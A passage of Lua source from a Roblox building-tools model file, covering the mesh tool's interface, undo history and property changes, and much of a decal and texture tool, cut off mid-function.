		self.GUI.SelectNote.Visible = true;
		self.GUI.Size = UDim2.new( 0, 200, 0, 55 );
	end;

end;

Tools.Mesh.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then
		local Container = Tool.Interfaces.BTMeshToolGUI:Clone();
		Container.Parent = UI;

		-- Add functionality to the add/remove buttons
		Container.AddButton.Button.MouseButton1Up:connect( function ()
			self:addMesh();
		end );
		Container.RemoveButton.Button.MouseButton1Up:connect( function ()
			self:removeMesh();
		end );

		-- Add the type dropdown
		local TypeDropdown = createDropdown();
		self.TypeDropdown = TypeDropdown;
		TypeDropdown.Frame.Parent = Container.TypeOption;
		TypeDropdown.Frame.Position = UDim2.new( 0, 40, 0, 0 );
		TypeDropdown.Frame.Size = UDim2.new( 1, -40, 0, 25 );
		TypeDropdown:addOption( "BLOCK" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.MeshType.Brick );
		end );
		TypeDropdown:addOption( "CYLINDER" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.MeshType.Cylinder );
		end );
		TypeDropdown:addOption( "FILE" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.MeshType.FileMesh );
		end );
		TypeDropdown:addOption( "HEAD" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.MeshType.Head );
		end );
		TypeDropdown:addOption( "SPHERE" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.MeshType.Sphere );
		end );
		TypeDropdown:addOption( "TRAPEZOID" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.MeshType.Torso );
		end );
		TypeDropdown:addOption( "WEDGE" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.MeshType.Wedge );
		end );

		-- Add functionality to the scale inputs
		Container.ScaleOption.XInput.TextButton.MouseButton1Down:connect( function ()
			self.State.scale_x_focused = true;
			Container.ScaleOption.XInput.TextBox:CaptureFocus();
		end );
		Container.ScaleOption.XInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.ScaleOption.XInput.TextBox.Text );
			if potential_new then
				self:changeScale( 'x', potential_new );
			end;
			self.State.scale_x_focused = false;
		end );

		Container.ScaleOption.YInput.TextButton.MouseButton1Down:connect( function ()
			self.State.scale_y_focused = true;
			Container.ScaleOption.YInput.TextBox:CaptureFocus();
		end );
		Container.ScaleOption.YInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.ScaleOption.YInput.TextBox.Text );
			if potential_new then
				self:changeScale( 'y', potential_new );
			end;
			self.State.scale_y_focused = false;
		end );

		Container.ScaleOption.ZInput.TextButton.MouseButton1Down:connect( function ()
			self.State.scale_z_focused = true;
			Container.ScaleOption.ZInput.TextBox:CaptureFocus();
		end );
		Container.ScaleOption.ZInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.ScaleOption.ZInput.TextBox.Text );
			if potential_new then
				self:changeScale( 'z', potential_new );
			end;
			self.State.scale_z_focused = false;
		end );

		-- Add functionality to the mesh/texture ID inputs
		Container.MeshIDOption.TextButton.MouseButton1Down:connect( function ()
			self.State.mesh_id_focused = true;
			Container.MeshIDOption.TextBox:CaptureFocus();
		end );
		Container.MeshIDOption.TextBox.FocusLost:connect( function ( enter_pressed )
			local input = Container.MeshIDOption.TextBox.Text;
			local potential_new = tonumber( input ) or input:lower():match( "%?id=([0-9]+)" );
			if potential_new then
				self:changeMesh( potential_new );
			end;
			self.State.mesh_id_focused = false;
		end );

		Container.TextureIDOption.TextButton.MouseButton1Down:connect( function ()
			self.State.texture_id_focused = true;
			Container.TextureIDOption.TextBox:CaptureFocus();
		end );
		Container.TextureIDOption.TextBox.FocusLost:connect( function ( enter_pressed )
			local input = Container.TextureIDOption.TextBox.Text;
			local potential_new = tonumber( input ) or input:lower():match( "%?id=([0-9]+)" );
			if potential_new then
				self:changeTexture( potential_new );
			end;
			self.State.texture_id_focused = false;
		end );

		-- Add functionality to the tint inputs
		Container.TintOption.RInput.TextButton.MouseButton1Down:connect( function ()
			self.State.tint_r_focused = true;
			Container.TintOption.RInput.TextBox:CaptureFocus();
		end );
		Container.TintOption.RInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.TintOption.RInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeTint( 'r', potential_new / 255 );
			end;
			self.State.tint_r_focused = false;
		end );

		Container.TintOption.GInput.TextButton.MouseButton1Down:connect( function ()
			self.State.tint_g_focused = true;
			Container.TintOption.GInput.TextBox:CaptureFocus();
		end );
		Container.TintOption.GInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.TintOption.GInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeTint( 'g', potential_new / 255 );
			end;
			self.State.tint_g_focused = false;
		end );

		Container.TintOption.BInput.TextButton.MouseButton1Down:connect( function ()
			self.State.tint_b_focused = true;
			Container.TintOption.BInput.TextBox:CaptureFocus();
		end );
		Container.TintOption.BInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.TintOption.BInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeTint( 'b', potential_new / 255 );
			end;
			self.State.tint_b_focused = false;
		end );

		Container.TintOption.HSVPicker.MouseButton1Up:connect( function ()
			ColorPicker:start( function ( ... )
				local args = { ... };
				-- If a color was picked, change the spotlights' color
				-- to the selected color
				if #args == 3 then
					local meshes = {};
					for _, Item in pairs( Selection.Items ) do
						local Mesh = _getChildOfClass( Item, "SpecialMesh" );
						if Mesh then
							table.insert( meshes, Mesh );
						end;
					end;
					self:startHistoryRecord( meshes );
					for _, Mesh in pairs( meshes ) do
						Mesh.VertexColor = Vector3.new( _HSVToRGB( ... ) );
					end;
					self:finishHistoryRecord();
				end;
			end, self.State.mesh_tint );
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Mesh.addMesh = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Mesh in pairs( self.meshes ) do
				Mesh.Parent = self.mesh_parents[Mesh];
				Selection:add( Mesh.Parent );
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Mesh in pairs( self.meshes ) do
				Selection:add( Mesh.Parent );
				Mesh.Parent = nil;
			end;
		end;
	};

	-- Add meshes to all the items from the selection that
	-- don't already have one
	local meshes = {};
	local mesh_parents = {};
	for _, Item in pairs( Selection.Items ) do
		local Mesh = _getChildOfClass( Item, "SpecialMesh" );
		if not Mesh then
			local Mesh = RbxUtility.Create "SpecialMesh" {
				Parent = Item;
				MeshType = Enum.MeshType.Brick;
			};
			table.insert( meshes, Mesh );
			mesh_parents[Mesh] = Item;
		end;
	end;

	HistoryRecord.meshes = meshes;
	HistoryRecord.mesh_parents = mesh_parents;
	History:add( HistoryRecord );

end;

Tools.Mesh.removeMesh = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Mesh in pairs( self.meshes ) do
				Selection:add( Mesh.Parent );
				Mesh.Parent = nil;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Mesh in pairs( self.meshes ) do
				Mesh.Parent = self.mesh_parents[Mesh];
				Selection:add( Mesh.Parent );
			end;
		end;
	};

	local meshes = {};
	local mesh_parents = {};
	-- Remove meshes from all the selected items
	for _, Item in pairs( Selection.Items ) do
		local meshes_found = _getChildrenOfClass( Item, "SpecialMesh" );
		for _, Mesh in pairs( meshes_found ) do
			table.insert( meshes, Mesh );
			mesh_parents[Mesh] = Mesh.Parent;
			Mesh.Parent = nil;
		end;
	end;

	HistoryRecord.meshes = meshes;
	HistoryRecord.mesh_parents = mesh_parents;
	History:add( HistoryRecord );

end;

Tools.Mesh.startHistoryRecord = function ( self, meshes )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( meshes );
		initial_type = {};
		terminal_type = {};
		initial_mesh = {};
		terminal_mesh = {};
		initial_texture = {};
		terminal_texture = {};
		initial_scale = {};
		terminal_scale = {};
		initial_tint = {};
		terminal_tint = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Selection:add( Target.Parent );
					Target.MeshType = self.initial_type[Target];
					Target.MeshId = self.initial_mesh[Target];
					Target.TextureId = self.initial_texture[Target];
					Target.Scale = self.initial_scale[Target];
					Target.VertexColor = self.initial_tint[Target];
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Selection:add( Target.Parent );
					Target.MeshType = self.terminal_type[Target];
					Target.MeshId = self.terminal_mesh[Target];
					Target.TextureId = self.terminal_texture[Target];
					Target.Scale = self.terminal_scale[Target];
					Target.VertexColor = self.terminal_tint[Target];
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_type[Item] = Item.MeshType;
			self.State.HistoryRecord.initial_mesh[Item] = Item.MeshId;
			self.State.HistoryRecord.initial_texture[Item] = Item.TextureId;
			self.State.HistoryRecord.initial_scale[Item] = Item.Scale;
			self.State.HistoryRecord.initial_tint[Item] = Item.VertexColor;
		end;
	end;

end;

Tools.Mesh.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_type[Item] = Item.MeshType;
			self.State.HistoryRecord.terminal_mesh[Item] = Item.MeshId;
			self.State.HistoryRecord.terminal_texture[Item] = Item.TextureId;
			self.State.HistoryRecord.terminal_scale[Item] = Item.Scale;
			self.State.HistoryRecord.terminal_tint[Item] = Item.VertexColor;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Mesh.changeMesh = function ( self, MeshID )

	local meshes = {};

	for _, Item in pairs( Selection.Items ) do
		local Mesh = _getChildOfClass( Item, "SpecialMesh" );
		if Mesh then
			table.insert( meshes, Mesh );
		end;
	end;

	-- Check if the given ID is not a mesh but an item containing a mesh, and extract
	-- the mesh data
	local TextureID, Tint, Scale;
	if HttpAvailable then
		local BaseMeshExtractionUrl = 'http://www.f3xteam.com/bt/getFirstMeshData/%s';
		local ExtractedMeshData = Tool.HttpInterface.GetAsync:InvokeServer( BaseMeshExtractionUrl:format( MeshID ) );
		if ExtractedMeshData and ExtractedMeshData:len() > 0 then
			-- Parse the response
			local ExtractedMeshData = RbxUtility.DecodeJSON( ExtractedMeshData );
			if ExtractedMeshData and ExtractedMeshData.success then
				-- Apply whatever data is available from that mesh
				if ExtractedMeshData.meshID then
					MeshID = ExtractedMeshData.meshID;
				end;
				if ExtractedMeshData.textureID then
					TextureID = ExtractedMeshData.textureID;
				end;
				Tint = Vector3.new( ExtractedMeshData.tint.x, ExtractedMeshData.tint.y, ExtractedMeshData.tint.z );
				Scale = Vector3.new( ExtractedMeshData.scale.x, ExtractedMeshData.scale.y, ExtractedMeshData.scale.z );
			end;
		end;
	end;

	self:startHistoryRecord( meshes );
	for _, Mesh in pairs( meshes ) do
		if MeshID then
			Mesh.MeshId = "http://www.mulrbx.com/asset/?id=" .. MeshID;
		end;
		if TextureID then
			Mesh.TextureId = "http://www.mulrbx.com/asset/?id=" .. TextureID;
		end;
		if Tint then
			Mesh.VertexColor = Tint;
		end;
		if Scale then
			Mesh.Scale = Scale;
		end;
	end;
	self:finishHistoryRecord();

end;

Tools.Mesh.changeTexture = function ( self, texture_id )

	local meshes = {};

	for _, Item in pairs( Selection.Items ) do
		local Mesh = _getChildOfClass( Item, "SpecialMesh" );
		if Mesh then
			table.insert( meshes, Mesh );
		end;
	end;

	-- Check if the given ID is actually a decal and get the right image ID from it
	if HttpAvailable then
		local BaseImageExtractionUrl = 'http://www.f3xteam.com/bt/getDecalImageID/%s';
		local ExtractedImageID = Tool.HttpInterface.GetAsync:InvokeServer( BaseImageExtractionUrl:format( texture_id ) );
		if ExtractedImageID and ExtractedImageID:len() > 0 then
			texture_id = ExtractedImageID;
		end;
	end;

	self:startHistoryRecord( meshes );
	for _, Mesh in pairs( meshes ) do
		Mesh.TextureId = "http://www.mulrbx.com/asset/?id=" .. texture_id;
	end;
	self:finishHistoryRecord();

end;

Tools.Mesh.changeScale = function ( self, component, new_value )

	local meshes = {};

	for _, Item in pairs( Selection.Items ) do
		local Mesh = _getChildOfClass( Item, "SpecialMesh" );
		if Mesh then
			table.insert( meshes, Mesh );
		end;
	end;

	self:startHistoryRecord( meshes );
	for _, Mesh in pairs( meshes ) do
		Mesh.Scale = Vector3.new(
			component == 'x' and new_value or Mesh.Scale.x,
			component == 'y' and new_value or Mesh.Scale.y,
			component == 'z' and new_value or Mesh.Scale.z
		);
	end;
	self:finishHistoryRecord();

end;

Tools.Mesh.changeTint = function ( self, component, new_value )

	local meshes = {};

	for _, Item in pairs( Selection.Items ) do
		local Mesh = _getChildOfClass( Item, "SpecialMesh" );
		if Mesh then
			table.insert( meshes, Mesh );
		end;
	end;

	self:startHistoryRecord( meshes );
	for _, Mesh in pairs( meshes ) do
		Mesh.VertexColor = Vector3.new(
			component == 'r' and new_value or Mesh.VertexColor.x,
			component == 'g' and new_value or Mesh.VertexColor.y,
			component == 'b' and new_value or Mesh.VertexColor.z
		);
	end;
	self:finishHistoryRecord();

end;

Tools.Mesh.hideGUI = function ( self )

	-- Hide the GUI if it exists already
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Mesh.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBXC6ABFC453416480FA58EB06EA337B5BE">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTTextureTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Texture tool
------------------------------------------

-- Create the tool
Tools.Texture = {};

-- Define the tool's color
Tools.Texture.Color = BrickColor.new( "Bright violet" );

-- Keep a container for state data
Tools.Texture.Options = {
	side = Enum.NormalId.Front;
	mode = "decal";
};
Tools.Texture.State = {};

-- Keep a container for temporary connections
Tools.Texture.Connections = {};

-- Keep a container for platform event connections
Tools.Texture.Listeners = {};

-- Start adding functionality to the tool
Tools.Texture.Listeners.Equipped = function ()

	local self = Tools.Texture;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Prepare the GUI
	self:changeSide( self.Options.side );
	self:changeMode( self.Options.mode );

	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

end;

Tools.Texture.Listeners.Unequipped = function ()

	local self = Tools.Texture;

	-- Stop the GUI updater
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Disconnect temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Texture.Listeners.Button2Down = function ()

	local self = Tools.Texture;

	-- Capture the camera rotation (for later use
	-- in determining whether a surface was being
	-- selected or the camera was being rotated
	-- with the right mouse button)
	local cr_x, cr_y, cr_z = Services.Workspace.CurrentCamera.CoordinateFrame:toEulerAnglesXYZ();
	self.State.PreB2DownCameraRotation = Vector3.new( cr_x, cr_y, cr_z );

end;

Tools.Texture.Listeners.Button2Up = function ()

	local self = Tools.Texture;

	local cr_x, cr_y, cr_z = Services.Workspace.CurrentCamera.CoordinateFrame:toEulerAnglesXYZ();
	local CameraRotation = Vector3.new( cr_x, cr_y, cr_z );

	-- If a surface is selected, change the side option
	if Selection:find( Mouse.Target ) and self.State.PreB2DownCameraRotation == CameraRotation then
		self:changeSide( Mouse.TargetSurface );
	end;

end;

Tools.Texture.startHistoryRecord = function ( self, textures )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( textures );
		initial_texture = {};
		terminal_texture = {};
		initial_transparency = {};
		terminal_transparency = {};
		initial_repeat = {};
		terminal_repeat = {};
		initial_side = {};
		terminal_side = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Selection:add( Target.Parent );
					Target.Texture = self.initial_texture[Target];
					Target.Transparency = self.initial_transparency[Target];
					Target.Face = self.initial_side[Target];
					if Target:IsA( "Texture" ) then
						Target.StudsPerTileU = self.initial_repeat[Target].x;
						Target.StudsPerTileV = self.initial_repeat[Target].y;
					end;
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Selection:add( Target.Parent );
					Target.Texture = self.terminal_texture[Target];
					Target.Transparency = self.terminal_transparency[Target];
					Target.Face = self.terminal_side[Target];
					if Target:IsA( "Texture" ) then
						Target.StudsPerTileU = self.terminal_repeat[Target].x;
						Target.StudsPerTileV = self.terminal_repeat[Target].y;
					end;
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_texture[Item] = Item.Texture;
			self.State.HistoryRecord.initial_transparency[Item] = Item.Transparency;
			self.State.HistoryRecord.initial_side[Item] = Item.Face;
			if Item:IsA( "Texture" ) then
				self.State.HistoryRecord.initial_repeat[Item] = Vector2.new( Item.StudsPerTileU, Item.StudsPerTileV );
			end;
		end;
	end;

end;

Tools.Texture.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_texture[Item] = Item.Texture;
			self.State.HistoryRecord.terminal_transparency[Item] = Item.Transparency;
			self.State.HistoryRecord.terminal_side[Item] = Item.Face;
			if Item:IsA( "Texture" ) then
				self.State.HistoryRecord.terminal_repeat[Item] = Vector2.new( Item.StudsPerTileU, Item.StudsPerTileV );
			end;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Texture.changeMode = function ( self, new_mode )

	-- Set the option
	self.Options.mode = new_mode;

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	-- Update the GUI
	if new_mode == "decal" then
		self.GUI.ModeOption.Decal.SelectedIndicator.Transparency = 0;
		self.GUI.ModeOption.Texture.SelectedIndicator.Transparency = 1;
		self.GUI.ModeOption.Decal.Background.Image = Assets.DarkSlantedRectangle;
		self.GUI.ModeOption.Texture.Background.Image = Assets.LightSlantedRectangle;
		self.GUI.AddButton.Button.Text = "ADD DECAL";
		self.GUI.RemoveButton.Button.Text = "REMOVE DECAL";
	elseif new_mode == "texture" then
		self.GUI.ModeOption.Decal.SelectedIndicator.Transparency = 1;
		self.GUI.ModeOption.Texture.SelectedIndicator.Transparency = 0;
		self.GUI.ModeOption.Decal.Background.Image = Assets.LightSlantedRectangle;
		self.GUI.ModeOption.Texture.Background.Image = Assets.DarkSlantedRectangle;
		self.GUI.AddButton.Button.Text = "ADD TEXTURE";
		self.GUI.RemoveButton.Button.Text = "REMOVE TEXTURE";
	end;

end;

Tools.Texture.changeSide = function ( self, new_side )

	-- Set the option
	self.Options.side = new_side;

	-- Update the GUI
	if self.SideDropdown then
		self.SideDropdown:selectOption( new_side.Name:upper() );
		if self.SideDropdown.open then
			self.SideDropdown:toggle();
		end;
	end;

end;

Tools.Texture.changeTexture = function ( self, new_texture )

	local textures = {};

	-- Apply the new texture to any items w/ textures in the selection
	-- that are on the side in the options
	for _, Item in pairs( Selection.Items ) do
		local textures_found = _getChildrenOfClass( Item, "Texture" );
		for _, Texture in pairs( textures_found ) do
			if Texture.Face == self.Options.side then
				table.insert( textures, Texture );
			end;
		end;
	end;

	-- Check if the given ID is actually a decal and get the right image ID from it
	if HttpAvailable then
		local BaseImageExtractionUrl = 'http://www.f3xteam.com/bt/getDecalImageID/%s';
		local ExtractedImageID = Tool.HttpInterface.GetAsync:InvokeServer( BaseImageExtractionUrl:format( new_texture ) );
		if ExtractedImageID and ExtractedImageID:len() > 0 then
			new_texture = ExtractedImageID;
		end;
	end;

	self:startHistoryRecord( textures );
	for _, Texture in pairs( textures ) do
		Texture.Texture = "http://www.mulrbx.com/asset/?id=" .. new_texture;
	end;
	self:finishHistoryRecord();

end;

Tools.Texture.changeDecal = function ( self, new_decal )

	local decals = {};

	-- Apply the new decal to any items w/ decals in the selection
	-- that are on the side in the options
	for _, Item in pairs( Selection.Items ) do
		local decals_found = _getChildrenOfClass( Item, "Decal" );
		for _, Decal in pairs( decals_found ) do
			if Decal.Face == self.Options.side then
				table.insert( decals, Decal );
			end;
		end;
	end;

	-- Check if the given ID is actually a decal and get the right image ID from it
	if HttpAvailable then
		local BaseImageExtractionUrl = 'http://www.f3xteam.com/bt/getDecalImageID/%s';
		local ExtractedImageID = Tool.HttpInterface.GetAsync:InvokeServer( BaseImageExtractionUrl:format( new_decal ) );
		if ExtractedImageID and ExtractedImageID:len() > 0 then
			new_decal = ExtractedImageID;
		end;
	end;

	self:startHistoryRecord( decals );
	for _, Decal in pairs( decals ) do
		Decal.Texture = "http://www.mulrbx.com/asset/?id=" .. new_decal;
	end;
	self:finishHistoryRecord();

end;

Tools.Texture.changeTransparency = function ( self, new_transparency )

	local textures = {};

	-- Apply the new transparency to any items w/
	-- decals/textures in the selectionthat are on
	-- the side in the options
	for _, Item in pairs( Selection.Items ) do

		if self.Options.mode == "texture" then
			local textures_found = _getChildrenOfClass( Item, "Texture" );
			for _, Texture in pairs( textures_found ) do
				if Texture.Face == self.Options.side then
					table.insert( textures, Texture );
				end;
			end;

		elseif self.Options.mode == "decal" then
			local decals_found = _getChildrenOfClass( Item, "Decal" );
			for _, Decal in pairs( decals_found ) do
				if Decal.Face == self.Options.side then
					table.insert( textures, Decal );
				end;
			end;
		end;

	end;

	self:startHistoryRecord( textures );
	for _, Texture in pairs( textures ) do
		Texture.Transparency = new_transparency;
	end;
	self:finishHistoryRecord();

end;

Tools.Texture.changeFrequency = function ( self, direction, new_frequency )

	local textures = {};

	-- Apply the new frequency to any items w/ textures
	-- in the selection that are on the side in the options
	for _, Item in pairs( Selection.Items ) do
		local textures_found = _getChildrenOfClass( Item, "Texture" );
		for _, Texture in pairs( textures_found ) do
			if Texture.Face == self.Options.side then
				table.insert( textures, Texture );
			end;
		end;
	end;

	self:startHistoryRecord( textures );
	for _, Texture in pairs( textures ) do
		-- Apply the new frequency to the right direction
		if direction == "x" then
			Texture.StudsPerTileU = new_frequency;
		elseif direction == "y" then
			Texture.StudsPerTileV = new_frequency;
		end;
	end;
	self:finishHistoryRecord();

end;

Tools.Texture.addTexture = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Texture in pairs( self.textures ) do
				Texture.Parent = self.texture_parents[Texture];
				Selection:add( Texture.Parent );
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Texture in pairs( self.textures ) do
				Selection:add( Texture.Parent );
				Texture.Parent = nil;
			end;
		end;
	};

	local textures = {};
	local texture_parents = {};

	for _, Item in pairs( Selection.Items ) do

		-- Check if the item has a texture already
		local textures_found = _getChildrenOfClass( Item, "Texture" );
		local has_texture = false;
		for _, Texture in pairs( textures_found ) do
			if Texture.Face == self.Options.side then
				has_texture = true;
				break;
			end;
		end;

		-- Only add a texture if it doesn't already exist
		if not has_texture then
			local Texture = RbxUtility.Create "Texture" {
				Parent = Item;
				Face = self.Options.side;
			};
			table.insert( textures, Texture );
			texture_parents[Texture] = Item;
		end;

	end;

	HistoryRecord.textures = textures;
	HistoryRecord.texture_parents = texture_parents;
	History:add( HistoryRecord );

end;

Tools.Texture.addDecal = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Decal in pairs( self.decals ) do
				Decal.Parent = self.decal_parents[Decal];
				Selection:add( Decal.Parent );
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Decal in pairs( self.decals ) do
				Selection:add( Decal.Parent );
				Decal.Parent = nil;
			end;
		end;
	};

	local decals = {};
	local decal_parents = {};

	for _, Item in pairs( Selection.Items ) do

		-- Check if the item has a decal already
		local decals_found = _getChildrenOfClass( Item, "Decal" );
		local has_decal = false;
		for _, Decal in pairs( decals_found ) do
			if Decal.Face == self.Options.side then
				has_decal = true;
				break;
			end;
		end;

		-- Only add a texture if it doesn't already exist
		if not has_decal then
			local Decal = RbxUtility.Create "Decal" {
				Parent = Item;
				Face = self.Options.side;
			};
			table.insert( decals, Decal );
			decal_parents[Decal] = Item;
		end;

	end;

	HistoryRecord.decals = decals;
	HistoryRecord.decal_parents = decal_parents;
	History:add( HistoryRecord );

end;

Tools.Texture.removeTexture = function ( self )

	local HistoryRecord = {
		textures = {};
		texture_parents = {};
		apply = function ( self )
			Selection:clear();
			for _, Texture in pairs( self.textures ) do
				Selection:add( Texture.Parent );
				Texture.Parent = nil;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Texture in pairs( self.textures ) do
				Texture.Parent = self.texture_parents[Texture];
				Selection:add( Texture.Parent );
			end;
		end;
	};

	-- Remove any textures on the selected side
	for _, Item in pairs( Selection.Items ) do
		local textures = _getChildrenOfClass( Item, "Texture" );
		for _, Texture in pairs( textures ) do
			if Texture.Face == self.Options.side then
				table.insert( HistoryRecord.textures, Texture );
				HistoryRecord.texture_parents[Texture] = Texture.Parent;
				Texture.Parent = nil;
			end;
		end;
	end;

	History:add( HistoryRecord );

end;

Tools.Texture.removeDecal = function ( self )

	local HistoryRecord = {
		decals = {};
		decal_parents = {};
		apply = function ( self )
			Selection:clear();
			for _, Decal in pairs( self.decals ) do
				Selection:add( Decal.Parent );
				Decal.Parent = nil;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Decal in pairs( self.decals ) do
				Decal.Parent = self.decal_parents[Decal];
				Selection:add( Decal.Parent );
			end;
		end;
	};

	-- Remove any decals on the selected side
	for _, Item in pairs( Selection.Items ) do
		local decals = _getChildrenOfClass( Item, "Decal" );
		for _, Decal in pairs( decals ) do
			if Decal.Face == self.Options.side then
				table.insert( HistoryRecord.decals, Decal );
				HistoryRecord.decal_parents[Decal] = Decal.Parent;
				Decal.Parent = nil;
			end;
		end;
	end;

	History:add( HistoryRecord );

end;

Tools.Texture.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	local GUI = self.GUI;

	-- If there are no items selected, just minimize
	-- non-tool-option controls
	if #Selection.Items == 0 then
		self.GUI.AddButton.Visible = false;
		self.GUI.RemoveButton.Visible = false;
		self.GUI.ImageIDOption.Visible = false;
		self.GUI.TransparencyOption.Visible = false;
		self.GUI.RepeatOption.Visible = false;
		self.GUI.Size = UDim2.new( 0, 200, 0, 100 );

	else
		if self.Options.mode == "texture" then

			-- Get the applicable textures
			local textures = {};
			for _, Item in pairs( Selection.Items ) do
				local textures_found = _getChildrenOfClass( Item, "Texture" );
				for _, Texture in pairs( textures_found ) do
					if Texture.Face == self.Options.side then
						table.insert( textures, Texture );
						break;
					end;
				end;
			end;

			-- If there are no textures
			if #textures == 0 then
				self.GUI.AddButton.Visible = true;
				self.GUI.RemoveButton.Visible = false;
				self.GUI.ImageIDOption.Visible = false;
				self.GUI.TransparencyOption.Visible = false;
				self.GUI.RepeatOption.Visible = false;
				self.GUI.Size = UDim2.new( 0, 200, 0, 130 );

			-- If only some parts have textures
			elseif #textures ~= #Selection.Items then
				self.GUI.AddButton.Visible = true;
				self.GUI.RemoveButton.Visible = true;
				self.GUI.ImageIDOption.Visible = true;
				self.GUI.TransparencyOption.Visible = true;
				self.GUI.RepeatOption.Visible = true;
				self.GUI.ImageIDOption.Position = UDim2.new( 0, 14, 0, 135 );
				self.GUI.TransparencyOption.Position = UDim2.new( 0, 14, 0, 170 );
				self.GUI.RepeatOption.Position = UDim2.new( 0, 0, 0, 205 );
				self.GUI.Size = UDim2.new( 0, 200, 0, 280 );

			-- If every item has a texture
			elseif #textures == #Selection.Items then
				self.GUI.AddButton.Visible = false;
				self.GUI.RemoveButton.Visible = true;
				self.GUI.ImageIDOption.Visible = true;
				self.GUI.TransparencyOption.Visible = true;
				self.GUI.RepeatOption.Visible = true;
				self.GUI.ImageIDOption.Position = UDim2.new( 0, 14, 0, 100 );
				self.GUI.TransparencyOption.Position = UDim2.new( 0, 14, 0, 135 );
				self.GUI.RepeatOption.Position = UDim2.new( 0, 0, 0, 170 );
				self.GUI.Size = UDim2.new( 0, 200, 0, 245 );
			end;

			-- Get the values to display on the GUI
			local texture_id, texture_transparency, texture_repeat_x, texture_repeat_y;
			for texture_index, Texture in pairs( textures ) do

				-- Set the start values for later comparison
				if texture_index == 1 then
